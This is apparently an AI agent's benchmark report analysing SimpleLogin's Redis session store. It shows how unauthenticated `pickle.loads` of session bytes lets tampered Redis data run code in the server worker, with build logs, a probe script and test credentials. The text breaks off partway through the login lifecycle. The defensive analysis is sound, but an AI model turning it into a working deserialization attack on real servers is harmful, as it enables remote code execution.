# SimpleLogin Server-Side (Redis-Backed) Flask Session Subsystem — Runtime-Grounded Q&A

> **Scope of this document.** This is a runtime-grounded investigation of how SimpleLogin's custom, Redis-backed Flask session subsystem behaves at runtime, with a focused analysis of how stored session data is turned back into Python objects (deserialization) and exactly where the boundary lies between a harmless session reset and a genuine code-execution risk. Every behavioral claim below is backed by **actual, complete, unedited output observed from running the real code paths** in the canonical Python 3.10 build — not by reading alone. Statements that could not be directly observed are explicitly labeled **inferred**. Anything not exercised under the canonical interpreter is labeled **NON-CANONICAL**.

---

## Headline finding (one paragraph)

The session subsystem is a custom `RedisSessionStore(SessionInterface)` (`app/session.py:31`) that **`pickle`-serializes** the session dictionary into Redis under the key `session:<uuid>` and signs **only the session-ID pointer** in the `slapp` cookie with `itsdangerous.Signer`. On each request, `RedisSessionStore.open_session` reads the raw bytes from Redis and calls **`pickle.loads(val)`** (`app/session.py:76`) to reconstruct the Python `dict`. That single call is wrapped in a bare **`try / except Exception: pass`** (`app/session.py:78-79`) with **no logging call inside it**, falling through to a brand-new empty session (`app/session.py:80`). Observed consequences: **(1)** corrupt/malformed bytes (random garbage or a truncated pickle) &rarr; `UnpicklingError` is raised, caught, and **silently swallowed** &rarr; the request gets a fresh session and proceeds normally (HTTP 302/200, **never a 500**), with **no error line in the logs and no Sentry event**; **(2)** a **well-formed malicious pickle** does **not** raise — its `__reduce__` callable **executes during `pickle.loads` itself** (`app/session.py:76`), *before* the `except` can help — so the true boundary is **"reset vs. code execution," not "reset vs. error"**; and **(3)** because the signer authenticates only the session-ID string (`_get_signer` at `app/session.py:37-41`) and applies **no MAC to the pickled payload**, an attacker who can tamper with the stored bytes but **cannot** forge the cookie still reaches the vulnerable `pickle.loads` by reusing a legitimately-signed cookie — changing the risk from a benign reset to potential remote code execution. Forging/altering the cookie signature, by contrast, makes `extract_and_validate_session_id` return `None` (`app/session.py:58-59`) and the tampered Redis value is **never read at all**.

---

## Methodology & canonical build

All reported values below were produced in the **canonical Python 3.10 build** delivered by the project's Docker container. The host agent sandbox (Python 3.13) is **NOT** canonical and was not used to produce any of the runtime evidence in the answer sections. This section states the exact build and invocation commands and pastes their complete, unedited output so a reviewer can replay the canonical run end-to-end.

| Item | Value |
|------|-------|
| Canonical image | `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0` (container name `sl_app`) |
| Interpreter | **Python 3.10.18** (canonical) |
| App entry point | `wsgi:app` (`wsgi.py` exposes `app = create_app()`) |
| Web server | `gunicorn 20.0.4`, `--bind 127.0.0.1:7788 --workers 1 --timeout 120` |
| Session backend | Redis 7 at `redis://localhost` (`MEM_STORE_URI`) |
| Database | PostgreSQL 15 at `postgresql://test:test@localhost:15432/test` (`DB_URI`) |
| Secret | `FLASK_SECRET=secret` (a **local test value**, not a real credential — from the project's `tests/test.env` template) |
| Seed user | `john@wick.com` / `password` (activated admin; created by `flask dummy-data`) |
| Sentry | `SENTRY_DSN` **unset** in the canonical local build &rarr; Sentry never initialized |

### Canonical image identity

```console
$ docker inspect --format '{{.Config.Image}}' sl_app
ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0
```

### Canonical interpreter

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && python --version'
Python 3.10.18
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && python -c "import sys; print(sys.executable)"'
/app/venv/bin/python
```

### Canonical build (`/build.sh`) — pre-existing, executed by the environment

The multi-service runtime (venv, Poetry-installed dependencies, PostgreSQL, Redis, generated keys, and the database schema migration) is produced by the container's `/build.sh`, which the environment ran during setup. `/build.sh` creates the virtualenv `/app/venv`, runs `poetry install`, starts PostgreSQL and Redis, generates local keys, and finally applies the Alembic schema migration with **`poetry run alembic upgrade head`**. It does **not** seed application data and does **not** run the test suite. Because the build is pre-existing, the exact verification commands and their complete output are pasted below.

**Migration state (canonical) — the schema is at Alembic head:**

```console
$ alembic current
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/spzjopltxissxyigfabr
Upload files to local dir
>>> init logging <<<
2026-07-08 06:18:39,762 - SL - DEBUG - 16554 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
INFO  [alembic.runtime.migration] Context impl PostgresqlImpl.
INFO  [alembic.runtime.migration] Will assume transactional DDL.
32f25cbf12f6 (head)

$ alembic heads
32f25cbf12f6 (head)

$ alembic upgrade head
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/tzinnmaeifzcfajhxhoi
Upload files to local dir
>>> init logging <<<
2026-07-08 06:18:41,128 - SL - DEBUG - 16558 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
INFO  [alembic.runtime.migration] Context impl PostgresqlImpl.
INFO  [alembic.runtime.migration] Will assume transactional DDL.
```

`alembic current` equals `alembic heads` (`32f25cbf12f6 (head)`) and a fresh `alembic upgrade head` is a no-op — i.e. the canonical database is fully migrated.

### Seed user (canonical)

The login user is created by the canonical seed command **`flask dummy-data`**. It was run during setup; re-running it now shows the seed already exists (a genuine `UniqueViolation` on `john@wick.com`), which is exactly why the login flow below succeeds. The complete, unedited output of the exact command follows.

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && cd /app && CONFIG=tests/test.env FLASK_APP=server.py flask dummy-data'
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/ybkjghcyneqbttjwwklg
Upload files to local dir
>>> init logging <<<
2026-07-08 06:18:57,727 - SL - DEBUG - 16571 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
2026-07-08 06:18:58,743 - SL - WARNING - 16571 - "/app/server.py:494" - dummy_data() -  - reset db, add fake data
2026-07-08 06:18:58,743 - SL - DEBUG - 16571 - "/app/app/fake_data.py:41" - fake_data() -  - create fake data
Traceback (most recent call last):
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1276, in _execute_context
    self.dialect.do_execute(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/default.py", line 608, in do_execute
    cursor.execute(statement, parameters)
psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "users_email_key"
DETAIL:  Key (email)=(john@wick.com) already exists.


The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/app/venv/bin/flask", line 8, in <module>
    sys.exit(main())
  File "/app/venv/lib/python3.10/site-packages/flask/cli.py", line 967, in main
    cli.main(args=sys.argv[1:], prog_name="python -m flask" if as_module else None)
  File "/app/venv/lib/python3.10/site-packages/flask/cli.py", line 586, in main
    return super(FlaskGroup, self).main(*args, **kwargs)
  File "/app/venv/lib/python3.10/site-packages/click/core.py", line 1053, in main
    rv = self.invoke(ctx)
  File "/app/venv/lib/python3.10/site-packages/click/core.py", line 1659, in invoke
    return _process_result(sub_ctx.command.invoke(sub_ctx))
  File "/app/venv/lib/python3.10/site-packages/click/core.py", line 1395, in invoke
    return ctx.invoke(self.callback, **ctx.params)
  File "/app/venv/lib/python3.10/site-packages/click/core.py", line 754, in invoke
    return __callback(*args, **kwargs)
  File "/app/venv/lib/python3.10/site-packages/click/decorators.py", line 26, in new_func
    return f(get_current_context(), *args, **kwargs)
  File "/app/venv/lib/python3.10/site-packages/flask/cli.py", line 426, in decorator
    return __ctx.invoke(f, *args, **kwargs)
  File "/app/venv/lib/python3.10/site-packages/click/core.py", line 754, in invoke
    return __callback(*args, **kwargs)
  File "/app/server.py", line 495, in dummy_data
    fake_data()
  File "/app/app/fake_data.py", line 44, in fake_data
    user = User.create(
  File "/app/app/models.py", line 609, in create
    Session.flush()
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/scoping.py", line 163, in do
    return getattr(self.registry(), name)(*args, **kwargs)
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/session.py", line 2540, in flush
    self._flush(objects)
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/session.py", line 2681, in _flush
    with util.safe_reraise():
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
    compat.raise_(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/util/compat.py", line 182, in raise_
    raise exception
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/session.py", line 2642, in _flush
    flush_context.execute()
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/unitofwork.py", line 422, in execute
    rec.execute(self)
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/unitofwork.py", line 586, in execute
    persistence.save_obj(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/persistence.py", line 239, in save_obj
    _emit_insert_statements(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/persistence.py", line 1135, in _emit_insert_statements
    result = cached_connections[connection].execute(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1011, in execute
    return meth(self, multiparams, params)
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/sql/elements.py", line 298, in _execute_on_connection
    return connection._execute_clauseelement(self, multiparams, params)
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1124, in _execute_clauseelement
    ret = self._execute_context(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1316, in _execute_context
    self._handle_dbapi_exception(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1510, in _handle_dbapi_exception
    util.raise_(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/util/compat.py", line 182, in raise_
    raise exception
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1276, in _execute_context
    self.dialect.do_execute(
  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/default.py", line 608, in do_execute
    cursor.execute(statement, parameters)
sqlalchemy.exc.IntegrityError: (psycopg2.errors.UniqueViolation) duplicate key value violates unique constraint "users_email_key"
DETAIL:  Key (email)=(john@wick.com) already exists.

[SQL: INSERT INTO users (password, created_at, updated_at, email, name, is_admin, alias_generator, notification, activated, disabled, profile_picture_id, otp_secret, enable_otp, last_otp, fido_uuid, default_alias_custom_domain_id, default_alias_public_domain_id, lifetime, paid_lifetime, lifetime_coupon_id, trial_end, default_mailbox_id, sender_format, sender_format_updated_at, replace_reverse_alias, referral_id, intro_shown, max_spam_score, newsletter_alias_id, include_sender_in_reverse_alias, random_alias_suffix, expand_alias_info, ignore_loop_email, alternative_id, disable_automatic_alias_note, one_click_unsubscribe_block_sender, include_website_in_one_click_alias, directory_quota, subdomain_quota, disable_import, can_use_phone, phone_quota, include_header_email_header, enable_data_breach_check, flags, unsub_behaviour, delete_on) VALUES (%(password)s, %(created_at)s, %(updated_at)s, %(email)s, %(name)s, %(is_admin)s, %(alias_generator)s, %(notification)s, %(activated)s, %(disabled)s, %(profile_picture_id)s, %(otp_secret)s, %(enable_otp)s, %(last_otp)s, %(fido_uuid)s, %(default_alias_custom_domain_id)s, %(default_alias_public_domain_id)s, %(lifetime)s, %(paid_lifetime)s, %(lifetime_coupon_id)s, %(trial_end)s, %(default_mailbox_id)s, %(sender_format)s, %(sender_format_updated_at)s, %(replace_reverse_alias)s, %(referral_id)s, %(intro_shown)s, %(max_spam_score)s, %(newsletter_alias_id)s, %(include_sender_in_reverse_alias)s, %(random_alias_suffix)s, %(expand_alias_info)s, %(ignore_loop_email)s, %(alternative_id)s, %(disable_automatic_alias_note)s, %(one_click_unsubscribe_block_sender)s, %(include_website_in_one_click_alias)s, %(directory_quota)s, %(subdomain_quota)s, %(disable_import)s, %(can_use_phone)s, %(phone_quota)s, %(include_header_email_header)s, %(enable_data_breach_check)s, %(flags)s, %(unsub_behaviour)s, %(delete_on)s) RETURNING users.id]
[parameters: {'password': '$2b$12$bvWpsXvQs8oHUlFLOkhKPOfkwLtOPZV3FK4oITV92VFww9ueV/R2S', 'created_at': datetime.datetime(2026, 7, 8, 6, 18, 58, 982506), 'updated_at': None, 'email': 'john@wick.com', 'name': 'John Wick', 'is_admin': True, 'alias_generator': 1, 'notification': True, 'activated': True, 'disabled': False, 'profile_picture_id': None, 'otp_secret': 'base32secret3232', 'enable_otp': False, 'last_otp': False, 'fido_uuid': None, 'default_alias_custom_domain_id': None, 'default_alias_public_domain_id': None, 'lifetime': False, 'paid_lifetime': False, 'lifetime_coupon_id': None, 'trial_end': datetime.datetime(2026, 7, 15, 7, 18, 58, 982549), 'default_mailbox_id': None, 'sender_format': '0', 'sender_format_updated_at': None, 'replace_reverse_alias': False, 'referral_id': None, 'intro_shown': True, 'max_spam_score': None, 'newsletter_alias_id': None, 'include_sender_in_reverse_alias': True, 'random_alias_suffix': 0, 'expand_alias_info': False, 'ignore_loop_email': False, 'alternative_id': None, 'disable_automatic_alias_note': False, 'one_click_unsubscribe_block_sender': False, 'include_website_in_one_click_alias': True, 'directory_quota': 50, 'subdomain_quota': 5, 'disable_import': False, 'can_use_phone': False, 'phone_quota': None, 'include_header_email_header': True, 'enable_data_breach_check': False, 'flags': 1, 'unsub_behaviour': 2, 'delete_on': None}]
(Background on this error at: http://sqlalche.me/e/13/gkpj)
```

**Seed-user verification (SQL):**

```console
$ docker exec sl_app bash -lc 'psql "postgresql://test:test@localhost:15432/test" -tAc "SELECT id,email,activated,is_admin FROM users WHERE email='"'"'john@wick.com'"'"'"'
395|john@wick.com|t|t
```

i.e. user id `395`, `activated = t`, `is_admin = t`.

### Runtime environment (`CONFIG=tests/test.env`)

The app is launched with the canonical environment selected by **`CONFIG=tests/test.env`** — the repository-tracked dotenv that `app/config.py:65` loads (`config_file = os.environ.get("CONFIG")`). It supplies `FLASK_SECRET=secret`, `MEM_STORE_URI=redis://localhost`, `DB_URI=postgresql://test:test@localhost:15432/test`, and `URL=http://localhost` (so `SESSION_COOKIE_SECURE` is **not** set — plain HTTP, matching `server.py:160-161`). Two variables the session/CLI paths need are **not** in that dotenv and are therefore set explicitly on the relevant command lines below: `FLASK_APP=server.py` (for the `flask dummy-data` seed command) and `PYTHONPATH=/app` (so a helper invoked as `python /tmp/<script>.py` can `import wsgi`/`app.*`; an inline `python -c` does not need it because the current directory is already on `sys.path`). `tests/test.env` is the same template the project uses for its test/CI runs, and `FLASK_SECRET=secret` is a **local test value**, not a real credential.

### Server invocation (canonical, detached; stdout+stderr captured for the R4 log-surface inspection)

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && cd /app && CONFIG=tests/test.env nohup gunicorn --bind 127.0.0.1:7788 --workers 1 --timeout 120 wsgi:app > /tmp/sl_server.log 2>&1 &'
$ sleep 6 && docker exec sl_app bash -lc 'sed -n "1,9p" /tmp/sl_server.log'
[2026-07-08 06:43:39 +0000] [17154] [INFO] Starting gunicorn 20.0.4
[2026-07-08 06:43:39 +0000] [17154] [INFO] Listening at: http://127.0.0.1:7788 (17154)
[2026-07-08 06:43:39 +0000] [17154] [INFO] Using worker: sync
[2026-07-08 06:43:39 +0000] [17155] [INFO] Booting worker with pid: 17155
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/xoetejeytohfnpoyxcpe
Upload files to local dir
>>> init logging <<<
2026-07-08 06:43:39,733 - SL - DEBUG - 17155 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
```

The gunicorn **master pid is 17154** and the single **worker pid is 17155** — this worker pid is the key evidence for R5/R6 (a marker file stamped with `ppid=17155` proves the *server worker* executed attacker code).

### Required precondition — the session interface is Redis-backed, and the serializer is stdlib `pickle`

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && cd /app && CONFIG=tests/test.env python -c "
from wsgi import app
si = app.session_interface
print(\"session_interface =\", type(si).__module__ + \".\" + type(si).__name__)
import app.session as s
print(\"pickle module name:\", s.pickle.__name__)
print(\"pickle module file:\", s.pickle.__file__)
try:
    import cPickle; print(\"cPickle importable:\", True)
except ImportError as e:
    print(\"cPickle importable:\", False, \"->\", e)
import pickle
print(\"DEFAULT_PROTOCOL:\", pickle.DEFAULT_PROTOCOL, \"HIGHEST_PROTOCOL:\", pickle.HIGHEST_PROTOCOL)
print(\"loads impl module:\", pickle.loads.__module__)
"'
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/onbfmfiphdldurdkptsl
Upload files to local dir
>>> init logging <<<
2026-07-08 06:20:26,961 - SL - DEBUG - 16653 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
session_interface = app.session.RedisSessionStore
pickle module name: pickle
pickle module file: /usr/local/lib/python3.10/pickle.py
cPickle importable: False -> No module named 'cPickle'
DEFAULT_PROTOCOL: 4 HIGHEST_PROTOCOL: 5
loads impl module: _pickle
```

This confirms `app.session_interface` is `app.session.RedisSessionStore` (wired for the `redis://` URI in `app/redis_services.py:12`) and that the serializer is the standard-library `pickle` at `/usr/local/lib/python3.10/pickle.py` (protocol 4).

### Endpoint reachability

```console
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:7788/health
200
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:7788/
302
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:7788/auth/login
200
```

### How the real login/logout path was driven

CSRF is enabled outside the test suite, so a cookie-jar HTTP client (`requests.Session`) was used **inside the container**: `GET /auth/login` first (creating the CSRF-only session and returning the initial `slapp` cookie), scrape the `csrf_token` hidden field, then `POST /auth/login` with `email`, `password`, `csrf_token`; logout via `GET /auth/logout`. This exercises the **real** entry point `login()` &rarr; `after_login()` &rarr; `login_user()` (`app/auth/views/login.py`, `app/auth/views/login_utils.py:36-37`) and `logout_session()` (`app/auth/views/logout.py:10`). `login_user()` was **never** called directly (that would be a bypass). Redis was inspected with a Python `redis` client; each payload was decoded with a canonical `pickle.loads`. The **exact driver script** and its complete output appear in the [Runtime driver script](#runtime-driver-script) section, and the driver's complete output is distributed across the R2/R3/R5/R6 evidence blocks below.

**Repository integrity.** This investigation is strictly read-only on all existing source. The only artifact added is this document. The final `git status --porcelain` proof is in the [Appendix](#appendix-repository-integrity-proof).

---

## Backend wiring: how the Redis session store is connected (plain vs Sentinel)

**Why this matters to the questions.** Every read in R1–R6 goes through `self._redis_r.get(...)` (`app/session.py:73`) and every write through `self._redis_w.setex(...)` (`app/session.py:97-101`). Those two handles are supplied by `initialize_redis_services(app, MEM_STORE_URI)` (`app/redis_services.py:9`), which chooses **one of three** branches by URL scheme. This determines whether the read and write connections are the same object (plain) or split across a master and a replica (Sentinel) — and therefore which connection an attacker who can write to Redis must reach to poison a session.

| URL scheme | Write handle `_redis_w` | Read handle `_redis_r` | `file:line` |
|------------|-------------------------|------------------------|-------------|
| `redis://` or `rediss://` (**canonical here**) | `storage.storage` | **the same** `storage.storage` | `app/redis_services.py:10-14` (wire at `:12`) |
| `redis+sentinel://` | `storage.storage` (Sentinel **master** → write) | `storage.storage_slave` (**replica** → read) | `app/redis_services.py:15-21` (wire at `:17-18`) |
| anything else | — | — | `raise RuntimeError(...)` at `app/redis_services.py:22-25` |

The relevant source (unmodified, `app/redis_services.py:10-25`):

```python
if redis_url.startswith("redis://") or redis_url.startswith("rediss://"):
    storage = limits.storage.RedisStorage(redis_url)
    app.session_interface = RedisSessionStore(storage.storage, storage.storage, app)   # L12: SAME conn for w and r
    set_redis_concurrent_lock(storage)
    rate_limit_set_redis(storage)
elif redis_url.startswith("redis+sentinel://"):
    storage = limits.storage.RedisSentinelStorage(redis_url)
    app.session_interface = RedisSessionStore(
        storage.storage, storage.storage_slave, app                                    # L17-18: master (w), slave (r)
    )
    set_redis_concurrent_lock(storage)
    rate_limit_set_redis(storage)
else:
    raise RuntimeError(
        f"Tried to set_redis_session with an invalid redis url: ${redis_url}"           # L24: note the literal '$'
    )
```

**Observed evidence.** A small probe (`obs_wiring.py`, run inside the container under the canonical venv) confirms the canonical plain-`redis://` wiring and the invalid-URL branch:

```python

"""Runtime probe of app/redis_services.py wiring (finding #4)."""
import flask
import limits.storage
from app.redis_services import initialize_redis_services

print("=== (a) CANONICAL plain redis:// wiring (observed) ===")
from wsgi import app
si = app.session_interface
print("session_interface:", type(si).__module__ + "." + type(si).__name__)
print("_redis_w is _redis_r ?", si._redis_w is si._redis_r)
print("_redis_w:", si._redis_w)
print("_redis_r:", si._redis_r)

print("\n=== (b) INVALID redis url -> RuntimeError (observed) ===")
tmp = flask.Flask("wiring_probe")
try:
    initialize_redis_services(tmp, "memcached://localhost:11211")
    print("NO ERROR (unexpected)")
except RuntimeError as e:
    print("RuntimeError:", e)

print("\n=== (c) redis+sentinel:// wiring attributes (grounding for master/slave split) ===")
print("RedisSentinelStorage has 'storage'       (master/write) attr ?", hasattr(limits.storage.RedisSentinelStorage, "storage") or "storage" in dir(limits.storage.RedisSentinelStorage))
print("RedisSentinelStorage has 'storage_slave' (slave/read)  attr ?", "storage_slave" in dir(limits.storage.RedisSentinelStorage))
# Show the property names actually present on the sentinel storage class
props = [n for n in dir(limits.storage.RedisSentinelStorage) if "storage" in n.lower()]
print("sentinel storage-related attributes:", props)
print("RedisStorage (plain) storage-related attributes:", [n for n in dir(limits.storage.RedisStorage) if "storage" in n.lower()])
```

```console
$ docker cp obs_wiring.py sl_app:/tmp/obs_wiring.py
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && cd /app && CONFIG=tests/test.env PYTHONPATH=/app python /tmp/obs_wiring.py'
>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/zrbtekqjuhkxvyepexes
Upload files to local dir
>>> init logging <<<
=== (a) CANONICAL plain redis:// wiring (observed) ===
2026-07-08 06:48:11,979 - SL - DEBUG - 17279 - "/app/app/utils.py:17" - <module>() -  - load words file: /app/local_data/test_words.txt
session_interface: app.session.RedisSessionStore
_redis_w is _redis_r ? True
_redis_w: Redis<ConnectionPool<Connection<host=localhost,port=6379,db=0>>>
_redis_r: Redis<ConnectionPool<Connection<host=localhost,port=6379,db=0>>>

=== (b) INVALID redis url -> RuntimeError (observed) ===
RuntimeError: Tried to set_redis_session with an invalid redis url: $memcached://localhost:11211

=== (c) redis+sentinel:// wiring attributes (grounding for master/slave split) ===
RedisSentinelStorage has 'storage'       (master/write) attr ? False
RedisSentinelStorage has 'storage_slave' (slave/read)  attr ? False
sentinel storage-related attributes: ['STORAGE_SCHEME', 'initialize_storage']
RedisStorage (plain) storage-related attributes: ['STORAGE_SCHEME', 'initialize_storage']
```

**Reading the output.**

- **Canonical branch (observed).** `MEM_STORE_URI=redis://localhost`, so the plain branch (`app/redis_services.py:10-14`) is taken: `_redis_w is _redis_r` is **`True`** and both are `Redis<ConnectionPool<Connection<host=localhost,port=6379,db=0>>>`. Reads and writes therefore hit the **same** connection — exactly the store poisoned in R3/R5/R6.
- **Invalid branch (observed).** An unrecognized scheme raises `RuntimeError: Tried to set_redis_session with an invalid redis url: $memcached://localhost:11211`. The leading **`$`** is literal — it is part of the f-string at `app/redis_services.py:24` (`f"... ${redis_url}"`), which the runtime reproduces verbatim.
- **Sentinel branch (code-grounded, NOT exercised — labeled).** The canonical build is plain `redis://`, so the `redis+sentinel://` branch was **not** exercised at runtime. From source (`app/redis_services.py:17-18`), it wires the **write** handle to `storage.storage` (the Sentinel *master*) and the **read** handle to `storage.storage_slave` (a *replica*). The probe's part (c) shows these are **instance** attributes (the class `dir()` exposes only `STORAGE_SCHEME`/`initialize_storage`), so the master/replica split is asserted from the source above, not from a class-attribute check — this claim is therefore **inferred from reading**, consistent with the rules' labeling requirement. In that topology a write-capable attacker would poison the *master*, and the poisoned payload would be read back from a *replica* after replication.

---
## The five user questions (reproduced verbatim)

1. *How does server-side session handling behave at runtime, especially when stored session data is turned back into Python objects (deserialization)?*
2. *What do normal sessions look like as users log in and out?*
3. *What actually happens if the session data in Redis is corrupted or malformed — does the next request fail, silently reset the session, or surface an error, and what shows up in responses or logs?*
4. *Where is the boundary between a harmless reset and a real deserialization risk (based on observed runtime behavior, not theory)?*
5. *If an attacker could tamper with session bytes but not forge the signed session ID, does that meaningfully change the risk, and how does runtime behavior support that conclusion?*

These map to the six named requirements answered below: **R1** (deserialization mechanism), **R2** (normal lifecycle), **R3** (malformed-data behavior), **R4** (response/log surface), **R5** (risk boundary), **R6** (attacker tampering without forging the ID).

---

## R1 — Deserialization mechanism

**Direct answer.** Stored session bytes are turned back into Python objects by a single call to **`data = pickle.loads(val)`** inside the method **`RedisSessionStore.open_session`** at **`app/session.py:76`**. `open_session` first resolves the session ID from the signed `slapp` cookie, reads the raw bytes at the Redis key `session:<uuid>` via `val = self._redis_r.get(self._get_key(session_id))` (`app/session.py:73`), and — if the value is present — unpickles it and wraps the resulting `dict` in a `ServerSession` (`app/session.py:77`). The serializer is the **standard-library `pickle`** module (the code prefers `cPickle`, which does not exist on Python 3, so the `except ImportError` fallback selects stdlib `pickle` — `app/session.py:9-12`).

**Grounding (`file:line`).**

- Serializer import with fallback — `app/session.py:9-12`:
  ```python
  try:
      import cPickle as pickle
  except ImportError:
      import pickle
  ```
- Key prefix `SESSION_PREFIX = "session"` — `app/session.py:18`; key builder `_get_key` &rarr; `f"{SESSION_PREFIX}:{session_Id}"` (i.e. `session:<uuid>`) — `app/session.py:44-45`.
- `RedisSessionStore.open_session` — `app/session.py:68-80`; the Redis read is `app/session.py:73`; **the deserialization call `data = pickle.loads(val)` is `app/session.py:76`**; the wrap `return ServerSession(data, session_id=session_id)` is `app/session.py:77`; `ServerSession(CallbackDict, SessionMixin)` is defined at `app/session.py:21-28`.

**Evidence.** The [Required precondition](#required-precondition--the-session-interface-is-redis-backed-and-the-serializer-is-stdlib-pickle) block above shows, from the running canonical build, that `app.session_interface` is `app.session.RedisSessionStore`, that `s.pickle.__name__` is `pickle` at `/usr/local/lib/python3.10/pickle.py`, that `cPickle` is **not** importable (`No module named 'cPickle'`), and that `pickle.DEFAULT_PROTOCOL` is `4`. Every payload observed below therefore begins with the protocol-4 frame bytes `\x80\x04`.

**Causal reasoning.** Redis stores opaque bytes; the application chose `pickle` to round-trip an arbitrary Python `dict`. On the way in, `save_session` calls `pickle.dumps(dict(session))` (`app/session.py:91`); on the way out, `open_session` calls `pickle.loads(val)` (`app/session.py:76`). Because `cPickle` is unavailable on Python 3, the runtime uses stdlib `pickle` (C-accelerated `_pickle` under the hood — note `loads impl module: _pickle` above). This `pickle.loads` call is the single most security-relevant line in the subsystem and is the focus of R3–R6.

---

## R2 — Normal session lifecycle

**Direct answer.** A session is a **signed session-ID cookie named `slapp`** (`SESSION_COOKIE_NAME = "slapp"`, `app/config.py:199`) plus a **pickled `dict` stored in Redis** at `session:<uuid>`. The cookie value has the shape `<uuid>.<itsdangerous-signature>`; only the UUID pointer is signed. A logged-in session's decoded dict contains `_user_id`, `_fresh`, `_id` (populated by Flask-Login's `login_user()`), `sudo_time` (set at `app/auth/views/login_utils.py:37`), the Flask-WTF `csrf_token`, and `_permanent`. Authenticated sessions get a **7-day (604800 s)** TTL (`server.py:204-207`); an unauthenticated request produces a **CSRF-only** session with a **300-second** TTL (`app/session.py:95-96`). **Logout** deletes the Redis key and **rotates the session ID to a new UUID** (`purge_session`, `app/session.py:61-66`, invoked by `logout_session()`, `app/session.py:117-121`) and the response deletes the `slapp` cookie (`app/auth/views/logout.py:13`).

### R2(a) — Unauthenticated / CSRF-only session (condition 3)

Complete driver output for the pre-login `GET /auth/login`:

```console
----- CONDITION 3: unauthenticated GET /auth/login (CSRF-only) -----
$ GET /auth/login -> 200
Set-Cookie: slapp=551174df-7aa7-418f-9cb6-a9e97d6fa5cc.Vg_2Ib6dRjazHoKeBYkRRUY5JEg; Expires=Wed, 15-Jul-2026 06:44:01 GMT; HttpOnly; Path=/; SameSite=Lax
slapp cookie value : 551174df-7aa7-418f-9cb6-a9e97d6fa5cc.Vg_2Ib6dRjazHoKeBYkRRUY5JEg
session uuid (unsigned): 551174df-7aa7-418f-9cb6-a9e97d6fa5cc
scraped csrf_token : IjlkN2RiNzUwZjQ4MzViNTNlZTFmZjBhOWRkZjJkZjBmZTY2YjAzN2Yi.ak3xsQ._R3jbjg3P4cEdjot-k0fI9hu5hs
$ redis EXISTS session:551174df-7aa7-418f-9cb6-a9e97d6fa5cc  -> 1
$ redis TTL    session:551174df-7aa7-418f-9cb6-a9e97d6fa5cc  -> 300
raw pickled bytes (96 bytes): b'\x80\x04\x95U\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x89\x8c\ncsrf_token\x94\x8c(9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f\x94u.'
decoded keys = ['_fresh', '_permanent', 'csrf_token']
    _fresh = False
    _permanent = True
    csrf_token = '9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f'
```

- The cookie carries **no `Secure` flag** because `URL=http://localhost` (not HTTPS) — matches `server.py:160-161`. `SameSite=Lax` and `HttpOnly` match `server.py:162` and `app/session.py:105-114`.
- **TTL = 300** confirms the CSRF-only branch: `save_session` sets `ttl = 300` when `"_user_id" not in session` (`app/session.py:95-96`).
- **Observed key set:** `['_fresh', '_permanent', 'csrf_token']` — the CSRF token plus Flask/Flask-Login bookkeeping (`_permanent`, `_fresh`), and notably **no `_user_id`** yet.

### R2(b) — Authenticated login (condition 1)

Complete driver output for `POST /auth/login` (email `john@wick.com`, password `password`, scraped `csrf_token`), reusing the same cookie jar:

```console
----- CONDITION 1: authenticated POST /auth/login -----
$ POST /auth/login -> 302
Location: http://127.0.0.1:7788/dashboard/
slapp cookie value : 551174df-7aa7-418f-9cb6-a9e97d6fa5cc.Vg_2Ib6dRjazHoKeBYkRRUY5JEg
session uuid       : 551174df-7aa7-418f-9cb6-a9e97d6fa5cc
session_id changed on login? False
